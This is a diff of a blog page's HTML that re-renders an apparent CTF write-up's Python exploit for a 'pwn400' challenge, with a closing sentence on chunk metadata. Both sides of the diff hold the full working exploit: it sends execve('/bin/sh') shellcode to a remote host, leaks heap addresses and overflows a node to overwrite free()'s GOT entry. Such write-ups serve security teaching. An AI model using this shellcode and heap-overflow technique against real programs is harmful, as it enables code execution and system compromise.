@@ -354,123 +354,122 @@
 
 <p>Here’s the python script. Due to the connection problem, it has to wait 1 second before it recieve server’s response.</p>
 
-<p>``` python pwn400.py
-from socket import *
-import time
-import binascii</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">binascii</span>
 
-<p>sock = socket(AF_INET, SOCK_STREAM)
-sock.connect((“218.2.197.248”, 10003))</p>
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"218.2.197.248"</span><span class="p">,</span> <span class="mi">10003</span><span class="p">))</span>
 
-<p>shell = “\x90\x90\x90\x90\x90\x90”+”\xeb\x08”+”AAAA”+”\x90”*10+”\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x59\x50\x5a\xb0\x0b\xcd\x80”</p>
+<span class="n">shell</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90</span><span class="s">"</span><span class="o">+</span><span class="s">"</span><span class="se">\xeb\x08</span><span class="s">"</span><span class="o">+</span><span class="s">"AAAA"</span><span class="o">+</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="mi">10</span><span class="o">+</span><span class="s">"</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x59\x50\x5a\xb0\x0b\xcd\x80</span><span class="s">"</span>
 
-<p>print sock.recv(1024)</p>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
 
-<p>#insert node1
-sock.send(“1\n”)
-time.sleep(1)
-print sock.recv(1024)
-sock.send(“1\n”)
-time.sleep(1)
-print sock.recv(1024)
-sock.send(“1\n”)
-time.sleep(1)
-print sock.recv(1024)
-sock.send(“1\n”)
-time.sleep(1)
-print sock.recv(1024)</p>
+<span class="c">#insert node1</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
 
-<p>#insert node2
-sock.send(“1\n”)
-time.sleep(1)
-print sock.recv(1024)
-sock.send(“2\n”)
-time.sleep(1)
-print sock.recv(1024)
-sock.send(“2\n”)
-time.sleep(1)
-print sock.recv(1024)
-sock.send(“2\n”)
-time.sleep(1)
-print sock.recv(1024)</p>
+<span class="c">#insert node2</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"2</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"2</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"2</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
 
-<p>#insert node3
-sock.send(“1\n”)
-time.sleep(1)
-print sock.recv(1024)
-sock.send(“3\n”)
-time.sleep(1)
-print sock.recv(1024)
-sock.send(“3\n”)
-time.sleep(1)
-print sock.recv(1024)
-sock.send(shell+”\n”) #write shellcode to node3’s content
-time.sleep(1)
-print sock.recv(1024)</p>
+<span class="c">#insert node3</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"3</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"3</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shell</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c">#write shellcode to node3's content</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
 
-<p>#show node 3 address
-sock.send(“3\n”)
-time.sleep(1)
-print sock.recv(1024)
-sock.send(“3\n”)
-time.sleep(1)
-res = sock.recv(1024)
-print res</p>
+<span class="c">#show node 3 address</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"3</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"3</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">res</span>
 
-<p>#calculate shellcode’s address
-index = res.index(“0x”)
-temp = res[index:index+10:]
-shellcode_addr = int(temp, 16)+108
-print “shellcode address: “, hex(shellcode_addr)
-shellcode_addr_str = binascii.a2b_hex(hex(shellcode_addr)[2:10:].zfill(8))
-print shellcode_addr_str</p>
+<span class="c">#calculate shellcode's address</span>
+<span class="n">index</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"0x"</span><span class="p">)</span>
+<span class="n">temp</span> <span class="o">=</span> <span class="n">res</span><span class="p">[</span><span class="n">index</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">10</span><span class="p">:]</span>
+<span class="n">shellcode_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">108</span>
+<span class="k">print</span> <span class="s">"shellcode address: "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span>
+<span class="n">shellcode_addr_str</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">a2b_hex</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="mi">10</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+<span class="k">print</span> <span class="n">shellcode_addr_str</span>
 
-<p>#show node 2 address
-sock.send(“3\n”)
-time.sleep(1)
-print sock.recv(1024)
-sock.send(“2\n”)
-time.sleep(1)
-res = sock.recv(1024)
-print res</p>
+<span class="c">#show node 2 address</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"3</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"2</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">res</span>
 
-<p>index = res.index(“0x”)
-temp = res[index:index+10:]
-address = int(temp, 16)
-del_addr = hex(address)[2::]
-print “node2 address:”, del_addr
-node2_addr_str = binascii.a2b_hex(hex(address)[2:10:].zfill(8))
-print node2_addr_str</p>
+<span class="n">index</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"0x"</span><span class="p">)</span>
+<span class="n">temp</span> <span class="o">=</span> <span class="n">res</span><span class="p">[</span><span class="n">index</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">10</span><span class="p">:]</span>
+<span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">del_addr</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">address</span><span class="p">)[</span><span class="mi">2</span><span class="p">::]</span>
+<span class="k">print</span> <span class="s">"node2 address:"</span><span class="p">,</span> <span class="n">del_addr</span>
+<span class="n">node2_addr_str</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">a2b_hex</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">address</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="mi">10</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+<span class="k">print</span> <span class="n">node2_addr_str</span> 
 
-<p>#BBBB: offset
-#free()’s GOT: 0x0804a450, we send 0x0804a44c
-exploit = “A”*256+”BBBB”+node2_addr_str[::-1]+shellcode_addr_str[::-1]+”\x4c\xa4\x04\x08”</p>
+<span class="c">#BBBB: offset</span>
+<span class="c">#free()'s GOT: 0x0804a450, we send 0x0804a44c</span>
+<span class="n">exploit</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">256</span><span class="o">+</span><span class="s">"BBBB"</span><span class="o">+</span><span class="n">node2_addr_str</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="n">shellcode_addr_str</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s">"</span><span class="se">\x4c\xa4\x04\x08</span><span class="s">"</span>
 
-<p>#edit node 1
-sock.send(“4\n”)
-time.sleep(1)
-print sock.recv(1024)
-sock.send(“1\n”)
-time.sleep(1)
-print sock.recv(1024)
-sock.send(exploit+”\n”) #overflow node1’s content
-time.sleep(1)
-print sock.recv(1024)</p>
+<span class="c">#edit node 1</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"4</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">exploit</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c">#overflow node1's content</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
 
-<p>#delete node 2
-sock.send(“5\n”)
-time.sleep(1)
-print sock.recv(1024)
-sock.send(del_addr+”\n”)
-time.sleep(1)
-print sock.recv(1024)</p>
+<span class="c">#delete node 2</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"5</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">del_addr</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
 
-<p>sock.send(‘cat /home/pwn3/flag/flag\n’) #capture the flag
-time.sleep(1)
-print sock.recv(1024)</p>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'cat /home/pwn3/flag/flag</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span> <span class="c">#capture the flag</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
 
-<p>sock.close()
-```</p>
+<span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
 
 <p>The “BBBB” in the exploit is a 4 bytes data between each node. It actually is the meta data of a chunk. The <code class="highlighter-rouge">free()</code> function will check the meta data before it free the memory of a node. If the meta data isn’t correct, the program will crash. But since we overwrite <code class="highlighter-rouge">free()</code>’s GOT, that meta data’s no longer a problem.</p>
 
